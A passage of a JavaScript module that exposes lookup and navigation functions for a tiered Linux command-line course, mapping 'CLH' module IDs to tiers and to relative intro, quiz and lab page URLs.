    // ═══════════════════════════════════════════════════════════════
    // PUBLIC API
    // ═══════════════════════════════════════════════════════════════

    /**
     * Get a module configuration by ID
     * @param {string} moduleId - The module ID (e.g., 'CLH-002')
     * @returns {object|null} Module configuration or null if not found
     */
    function getModule(moduleId) {
        return MODULES[moduleId] || null;
    }

    /**
     * Get all module IDs
     * @returns {string[]} Array of module IDs
     */
    function getAllModuleIds() {
        return Object.keys(MODULES);
    }

    /**
     * Get modules by tier
     * @param {string} tierName - Tier name (e.g., 'CLI Recruit')
     * @returns {string[]} Array of module IDs in that tier
     */
    function getModulesByTier(tierName) {
        const tier = TIERS[tierName];
        return tier ? tier.modules : [];
    }

    /**
     * Get tier information
     * @param {string} tierName - Tier name
     * @returns {object|null} Tier info or null
     */
    function getTier(tierName) {
        return TIERS[tierName] || null;
    }

    /**
     * Get all tier names in order
     * @returns {string[]} Array of tier names
     */
    function getAllTiers() {
        return Object.keys(TIERS);
    }

    /**
     * Check if a module ID is valid
     * @param {string} moduleId - Module ID to check
     * @returns {boolean}
     */
    function isValidModule(moduleId) {
        return moduleId in MODULES;
    }

    /**
     * Get the next module after the given one
     * @param {string} moduleId - Current module ID
     * @returns {string|null} Next module ID or null if last
     */
    function getNextModule(moduleId) {
        const ids = Object.keys(MODULES);
        const index = ids.indexOf(moduleId);
        if (index === -1 || index === ids.length - 1) {
            return null;
        }
        return ids[index + 1];
    }

    /**
     * Get the previous module
     * @param {string} moduleId - Current module ID
     * @returns {string|null} Previous module ID or null if first
     */
    function getPreviousModule(moduleId) {
        const ids = Object.keys(MODULES);
        const index = ids.indexOf(moduleId);
        if (index <= 0) {
            return null;
        }
        return ids[index - 1];
    }

    /**
     * Get the URL to the next module's INTRO page (not the lab)
     * This implements the correct learning flow: Lab → Next Intro → Quiz → Lab
     * @param {string} moduleId - Current module ID (e.g., 'CLH-002')
     * @returns {object} { url: string, isLast: boolean, nextModuleId: string|null }
     */
    function getNextIntroUrl(moduleId) {
        const nextModuleId = getNextModule(moduleId);

        if (!nextModuleId) {
            // This is the last module - return to Script House
            return {
                url: '../../index.html',
                isLast: true,
                nextModuleId: null
            };
        }

        // Extract the number from CLH-XXX format
        const match = nextModuleId.match(/CLH-(\d+)/i);
        if (!match) {
            return {
                url: '../../index.html',
                isLast: true,
                nextModuleId: null
            };
        }

        const nextNum = match[1]; // e.g., '003'

        // From lab (applets/linux/), intro is at ../../clh/clh-XXX-intro.html
        return {
            url: `../../clh/clh-${nextNum}-intro.html`,
            isLast: false,
            nextModuleId: nextModuleId
        };
    }

    /**
     * Get the URL to the current module's intro page
     * @param {string} moduleId - Module ID (e.g., 'CLH-002')
     * @returns {string} URL to intro page
     */
    function getIntroUrl(moduleId) {
        const match = moduleId.match(/CLH-(\d+)/i);
        if (!match) return '../../clh/clh-001-intro.html';
        return `../../clh/clh-${match[1]}-intro.html`;
    }

    /**
     * Get the URL to the current module's quiz page
     * @param {string} moduleId - Module ID (e.g., 'CLH-002')
     * @returns {string} URL to quiz page
     */
    function getQuizUrl(moduleId) {
        const match = moduleId.match(/CLH-(\d+)/i);
        if (!match) return '../../clh/clh-001-quiz.html';
        return `../../clh/clh-${match[1]}-quiz.html`;
    }

    // ═══════════════════════════════════════════════════════════════
    // EXPOSE PUBLIC API
    // ═══════════════════════════════════════════════════════════════

    return {
        getModule,
        getAllModuleIds,
        getModulesByTier,
        getTier,
        getAllTiers,
        isValidModule,
        getNextModule,
        getPreviousModule,
        getNextIntroUrl,
        getIntroUrl,
        getQuizUrl,

        // Expose constants for debugging
        _MODULES: MODULES,
        _TIERS: TIERS,
    };

})();
